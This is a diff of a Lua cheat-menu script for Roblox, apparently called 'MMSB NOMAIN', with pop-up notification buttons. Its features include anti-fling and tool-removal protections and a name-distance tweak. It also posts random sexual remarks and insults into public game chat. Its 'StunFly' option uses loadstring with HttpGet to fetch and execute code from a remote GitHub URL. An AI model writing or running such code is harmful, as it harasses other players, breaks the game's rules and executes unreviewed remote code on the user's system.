-					velocityoverlimit = true
-					if tracebackactive ~= true then
-						--  if game.Players.LocalPlayer.Character.Humanoid.FloorMaterial == Enum.Material.Air then
-						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savedpos) * CFrame.Angles(math.rad(savedori.X),math.rad(savedori.Y),math.rad(savedori.Z))
-						game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)  game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0) 
-						game.Players.LocalPlayer.Character.Torso.Velocity = Vector3.new(0,0,0) game.Players.LocalPlayer.Character.Torso.RotVelocity = Vector3.new(0,0,0)
-						repeatstand()
-						velocityoverlimit = false
-						tracebackactive = false
+			if name == "SexualRemark" then
+				local insulttable = SInsults
+				local ftable = insulttable[math.random(1,#insulttable)]
+				if ftable == LastInsult then 
+					local ftable = insulttable[math.random(1,#insulttable)]
+					if ftable == LastInsult then 
 						StarterGui:SetCore("SendNotification", {
-							Title = "ANTI-FLING ATTENTION",
-							Text = "Someone tried to fling you",
+							Title = "SEXUAL REMARK",
+							Text = "Canceled Remark, Repeated Text x2.",
 							Duration = 5,
 							Callback = bindable
 						})
+						colornotification("SEXUAL REMARK",WarningColor)
+					else
+						if string.find(ftable,"#") then
+							StarterGui:SetCore("SendNotification", {
+								Title = "SEXUAL REMARK ERROR",
+								Text = "Message Contained Hashtags. Check Console for message",
+								Duration = 5,
+								Callback = bindable
+							})
+							warn(ftable)
+							colornotification("SEXUAL REMARK",AttentionColor)
+						else
+							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ftable, "All")
+							LastInsult = ftable
+						end
 					end
-					--	end
-				end
-			else
-				velocityoverlimit = false
-			end
-		end)
-		local ap = coroutine.create(function()
-			while wait() do
-				if velocityoverlimit == false then
-					savedpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
-					savedori = game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation
-					--	a = Instance.new("Part",workspace) a.CanCollide = false a.Transparency = 1 a.Anchored = true a.Size = Vector3.new(0.1,0.1,0.1)
-					--		a.CFrame = game.Players.LocalPlayer.Character.Head.CFrame game.Debris:AddItem(a,20) 
 				else
-
+					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ftable, "All")
+					LastInsult = ftable
 				end
-			end
-		end)
-		coroutine.resume(ap)
-	elseif name == "Anti-ToolKill" then
-		StarterGui:SetCore("SendNotification", {
-			Title = "MMSB NOMAIN INFORMATION",
-			Text = "Anti-ToolKill Enabled",
-			Duration = 5,
-			Callback = bindable
-		})
-
-		for _,tool in ipairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
-			if tool:IsA("Tool") then
-				table.insert(savedtools,tool) 
-			end
-		end
-		for _,tool in ipairs(game.Players.LocalPlayer.Character:GetChildren()) do
-			if tool:IsA("Tool") then
-				table.insert(savedtools,tool) 
-			end
-		end
-
-		game.Players.LocalPlayer.Character.ChildAdded:Connect(function(child)
-			if child:IsA("Tool") then
-				if table.find(savedtools,child) then
+			elseif name == "MakeARemark" then
+				local insulttable = TInsults
+				local ftable = insulttable[math.random(1,#insulttable)]
+				if ftable == LastInsult then 
+					local ftable = insulttable[math.random(1,#insulttable)]
+					if ftable == LastInsult then 
+						StarterGui:SetCore("SendNotification", {
+							Title = "REMARK",
+							Text = "Canceled Remark, Repeated Text x2.",
+							Duration = 5,
+							Callback = bindable
+						})
+						colornotification("REMARK",WarningColor)
+					else
+						if string.find(ftable,"#") then
+							StarterGui:SetCore("SendNotification", {
+								Title = "REMARK ERROR",
+								Text = "Message Contained Hashtags. Check Console for message.",
+								Duration = 5,
+								Callback = bindable
+							})
+							warn(ftable)
+							colornotification("REMARK",AttentionColor)
+						else
+							game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ftable, "All")
+							LastInsult = ftable
+						end
+					end
 				else
-					StarterGui:SetCore("SendNotification", {
-						Title = "ANTI-TOOKILL WARNING",
-						Text = child.Name.." was removed from your inventory.",
-						Duration = 5,
-						Callback = bindable
-					})
-
-					game.Debris:AddItem(child,0)
+					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ftable, "All")
+					LastInsult = ftable
 				end
 			end
-		end)
-	end
 
-	if name == "NameDist" then
-		for _,v in ipairs(game.Players:GetChildren()) do
-			if v:IsA("Player") then
-				v.Character.Humanoid.NameDisplayDistance = math.huge
+			if name == "RandomMath" then
+				local val  = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame local r1 = math.random(-math.pi,math.pi) local r = math.random(1,2) local t = nil
+				local tg = nil
+				if r == 1 then
+					t="*"
+				else
+					t="/"
+				end
+				local m = r1 * math.random(10,28462) / r * math.floor(math.pi)
+				local args = {
+					[1] =  "you have ".. tostring(m).. " ¤™",
+					[2] = "All"
+				}
+				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+				if m <= 0 then
+					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("you are in debt.", "All")
+				else
+					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("you are rich", "All")
+				end
+			end
+
+			if name == "Anti-Fling" then
+				StarterGui:SetCore("SendNotification", {
+					Title = "MMSB NOMAIN INFORMATION",
+					Text = "Anti-Fling Enabled",
+					Duration = 5,
+					Callback = bindable
+				})
+
+				game["Run Service"].RenderStepped:Connect(function()
+					if game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.X >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Y >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity.Z >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity.X >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity.Y >= maxspeed or game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity.Z >= maxspeed then
+						if game.Players.LocalPlayer.Character.Humanoid.Sit ~= true then
+							velocityoverlimit = true
+							if tracebackactive ~= true then
+								--  if game.Players.LocalPlayer.Character.Humanoid.FloorMaterial == Enum.Material.Air then
+								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(savedpos) * CFrame.Angles(math.rad(savedori.X),math.rad(savedori.Y),math.rad(savedori.Z))
+								game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)  game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0) 
+								game.Players.LocalPlayer.Character.Torso.Velocity = Vector3.new(0,0,0) game.Players.LocalPlayer.Character.Torso.RotVelocity = Vector3.new(0,0,0)
+								repeatstand()
+								velocityoverlimit = false
+								tracebackactive = false
+								StarterGui:SetCore("SendNotification", {
+									Title = "ANTI-FLING ATTENTION",
+									Text = "Someone tried to fling you",
+									Duration = 5,
+									Callback = bindable
+								})
+							end
+							--	end
+						end
+					else
+						velocityoverlimit = false
+					end
+				end)
+				local ap = coroutine.create(function()
+					while wait() do
+						if velocityoverlimit == false then
+							savedpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
+							savedori = game.Players.LocalPlayer.Character.HumanoidRootPart.Orientation
+							--	a = Instance.new("Part",workspace) a.CanCollide = false a.Transparency = 1 a.Anchored = true a.Size = Vector3.new(0.1,0.1,0.1)
+							--		a.CFrame = game.Players.LocalPlayer.Character.Head.CFrame game.Debris:AddItem(a,20) 
+						else
+
+						end
+					end
+				end)
+				coroutine.resume(ap)
+			elseif name == "Anti-ToolKill" then
+				StarterGui:SetCore("SendNotification", {
+					Title = "MMSB NOMAIN INFORMATION",
+					Text = "Anti-ToolKill Enabled",
+					Duration = 5,
+					Callback = bindable
+				})
+
+				for _,tool in ipairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+					if tool:IsA("Tool") then
+						table.insert(savedtools,tool) 
+					end
+				end
+				for _,tool in ipairs(game.Players.LocalPlayer.Character:GetChildren()) do
+					if tool:IsA("Tool") then
+						table.insert(savedtools,tool) 
+					end
+				end
+
+				game.Players.LocalPlayer.Character.ChildAdded:Connect(function(child)
+					if child:IsA("Tool") then
+						if table.find(savedtools,child) then
+						else
+							StarterGui:SetCore("SendNotification", {
+								Title = "ANTI-TOOKILL WARNING",
+								Text = child.Name.." was removed from your inventory.",
+								Duration = 5,
+								Callback = bindable
+							})
+
+							game.Debris:AddItem(child,0)
+						end
+					end
+				end)
+			end
+
+			if name == "NameDist" then
+				for _,v in ipairs(game.Players:GetChildren()) do
+					if v:IsA("Player") then
+						v.Character.Humanoid.NameDisplayDistance = math.huge
+					end
+				end
+			end
+
+			if name == "StunFly" then
+				loadstring(game:HttpGet(('https://raw.githubusercontent.com/MachiavelliModder/MMSB-DATA/main/StunFly'),true))()
+				StarterGui:SetCore("SendNotification", {
+					Title = "MMSB NOMAIN",
+					Text = "Reset to remove StunFly",
+					Duration = 5,
+					Callback = bindable
+				})
+			end
+
+			if name == "Empty" or name == "WIP" then
+				bruh()
 			end
 		end
-	end
-
-	if name == "StunFly" then
-		loadstring(game:HttpGet(('https://raw.githubusercontent.com/MachiavelliModder/MMSB-DATA/main/StunFly'),true))()
-		StarterGui:SetCore("SendNotification", {
-			Title = "MMSB NOMAIN",
-			Text = "Reset to remove StunFly",
-			Duration = 5,
-			Callback = bindable
-		})
-	end
-
-	if name == "Empty" or name == "WIP" then
-		bruh()
-	end
-end
 
 
 --[[
@@ -1219,148 +1402,148 @@ for _,v in ipairs(game.CoreGui.RobloxGui:GetDescendants()) do
     end
 end
 ]]
-	function bindable.OnInvoke(response)
-		if response == "Y" then
-			fireresponse("Y")
-			bruh()      
+		function bindable.OnInvoke(response)
+			if response == "Y" then
+				fireresponse("Y")
+				bruh()      
 
-		elseif response == "CopyToClip" then
-			fireresponse("CopyToClip")
-			bruh()
+			elseif response == "CopyToClip" then
+				fireresponse("CopyToClip")
+				bruh()
 
-		elseif response == "N" then
-			fireresponse("N")
-			bruh()
+			elseif response == "N" then
+				fireresponse("N")
+				bruh()
 
-		elseif response == "SaveToFile" then
-			fireresponse("SaveToFile")
-			bruh()
+			elseif response == "SaveToFile" then
+				fireresponse("SaveToFile")
+				bruh()
 
-		elseif response == "RandomMath" then
-			fireresponse("RandomMath")
-			bruh()
+			elseif response == "RandomMath" then
+				fireresponse("RandomMath")
+				bruh()
 
-		elseif response == "MakeARemark" then
-			fireresponse("MakeARemark")
-			bruh()
+			elseif response == "MakeARemark" then
+				fireresponse("MakeARemark")
+				bruh()
 
-		elseif response == "SexualRemark" then
-			fireresponse("SexualRemark")
-			bruh()
+			elseif response == "SexualRemark" then
+				fireresponse("SexualRemark")
+				bruh()
 
-		elseif response == "Anti-Fling" then
-			fireresponse("Anti-Fling")
-			bruh()
+			elseif response == "Anti-Fling" then
+				fireresponse("Anti-Fling")
+				bruh()
 
-		elseif response == "NameDist" then
-			fireresponse("NameDist")
-			bruh()
+			elseif response == "NameDist" then
+				fireresponse("NameDist")
+				bruh()
 
-		elseif response == "Anti-ToolKill" then
-			fireresponse("Anti-ToolKill")
-			bruh()
+			elseif response == "Anti-ToolKill" then
+				fireresponse("Anti-ToolKill")
+				bruh()
 
-		elseif response == "StunFly" then
-			fireresponse("StunFly")
-			bruh()
+			elseif response == "StunFly" then
+				fireresponse("StunFly")
+				bruh()
 
-		elseif response == "Empty" then
-			fireresponse("Empty")
-			bruh()
+			elseif response == "Empty" then
+				fireresponse("Empty")
+				bruh()
 
-		elseif response == "Page2" then --------PAGE 2
-			bruh()
-			local a = coroutine.create(function()
-				wait(.1)
-				StarterGui:SetCore("SendNotification", {
-					Title = "Code Execution",
-					Text = "4th Option",
-					Duration = aduration,
-					Callback = bindable,
-					Button1 = "Anti-ToolKill",
-					Button2 = "NameDist",
-				})
-				wait(.1)
-				StarterGui:SetCore("SendNotification", {
-					Title = "Code Execution",
-					Text = "5th Option",
-					Duration = aduration,
-					Callback = bindable,
-					Button1 = "MakeARemark",
-					Button2 = "SexualRemark",
-				})
-				wait(.1)
-				StarterGui:SetCore("SendNotification", {
-					Title = "Code Execution",
-					Text = "6th Option",
-					Duration = aduration,
-					Callback = bindable,
-					Button1 = "RandomMath",
-					Button2 = "Page3",
-				})
-			end)
-			coroutine.resume(a)
+			elseif response == "Page2" then --------PAGE 2
+				bruh()
+				local a = coroutine.create(function()
+					wait(.1)
+					StarterGui:SetCore("SendNotification", {
+						Title = "Code Execution",
+						Text = "4th Option",
+						Duration = aduration,
+						Callback = bindable,
+						Button1 = "Anti-ToolKill",
+						Button2 = "NameDist",
+					})
+					wait(.1)
+					StarterGui:SetCore("SendNotification", {
+						Title = "Code Execution",
+						Text = "5th Option",
+						Duration = aduration,
+						Callback = bindable,
+						Button1 = "MakeARemark",
+						Button2 = "SexualRemark",
+					})
+					wait(.1)
+					StarterGui:SetCore("SendNotification", {
+						Title = "Code Execution",
+						Text = "6th Option",
+						Duration = aduration,
+						Callback = bindable,
+						Button1 = "RandomMath",
+						Button2 = "Page3",
+					})
+				end)
+				coroutine.resume(a)
 
-		elseif response == "Page3" then --------PAGE 3
-			bruh()
-			local a = coroutine.create(function()
-				wait(.1)
-				StarterGui:SetCore("SendNotification", {
-					Title = "Code Execution",
-					Text = "7th Option",
-					Duration = aduration,
-					Callback = bindable,
-					Button1 = "StunFly",
-					Button2 = "Empty",
-				})
-				wait(.1)
-				StarterGui:SetCore("SendNotification", {
-					Title = "Code Execution",
-					Text = "8th Option",
-					Duration = aduration,
-					Callback = bindable,
-					Button1 = "Empty",
-					Button2 = "Empty",
-				})
-				wait(.1)
-				StarterGui:SetCore("SendNotification", {
-					Title = "Code Execution",
-					Text = "9th Option",
-					Duration = aduration,
-					Callback = bindable,
-					Button1 = "Empty",
-					Button2 = "Page4",
-				})
-			end)
-			coroutine.resume(a)
+			elseif response == "Page3" then --------PAGE 3
+				bruh()
+				local a = coroutine.create(function()
+					wait(.1)
+					StarterGui:SetCore("SendNotification", {
+						Title = "Code Execution",
+						Text = "7th Option",
+						Duration = aduration,
+						Callback = bindable,
+						Button1 = "StunFly",
+						Button2 = "Empty",
+					})
+					wait(.1)
+					StarterGui:SetCore("SendNotification", {
+						Title = "Code Execution",
+						Text = "8th Option",
+						Duration = aduration,
+						Callback = bindable,
+						Button1 = "Empty",
+						Button2 = "Empty",
+					})
+					wait(.1)
+					StarterGui:SetCore("SendNotification", {
+						Title = "Code Execution",
+						Text = "9th Option",
+						Duration = aduration,
+						Callback = bindable,
+						Button1 = "Empty",
+						Button2 = "Page4",
+					})
+				end)
+				coroutine.resume(a)
+			end
 		end
-	end
-	StarterGui:SetCore("SendNotification", {
-		Title = "Code Execution",
-		Text = "rawr uwu X3",
-		Duration = aduration,
-		Callback = bindable,
-		Button1 = "what",
-		Button2 = "wtf",
-	})
-	wait(.1)
-	StarterGui:SetCore("SendNotification", {
-		Title = "Code Execution",
-		Text = "2nd Option",
-		Duration = aduration,
-		Callback = bindable,
-		Button1 = "CopyToClip",
-		Button2 = "SaveToFile",
-	})
-	wait(.1)
-	StarterGui:SetCore("SendNotification", {
-		Title = "Code Execution",
-		Text = "3rd Option",
-		Duration = aduration,
-		Callback = bindable,
-		Button1 = "Anti-Fling",
-		Button2 = "Page2",
-	})
+		StarterGui:SetCore("SendNotification", {
+			Title = "Code Execution",
+			Text = "rawr uwu X3",
+			Duration = aduration,
+			Callback = bindable,
+			Button1 = "what",
+			Button2 = "wtf",
+		})
+		wait(.1)
+		StarterGui:SetCore("SendNotification", {
+			Title = "Code Execution",
+			Text = "2nd Option",
+			Duration = aduration,
+			Callback = bindable,
+			Button1 = "CopyToClip",
+			Button2 = "SaveToFile",
+		})
+		wait(.1)
+		StarterGui:SetCore("SendNotification", {
+			Title = "Code Execution",
+			Text = "3rd Option",
+			Duration = aduration,
+			Callback = bindable,
+			Button1 = "Anti-Fling",
+			Button2 = "Page2",
+		})
 
 
 	end)
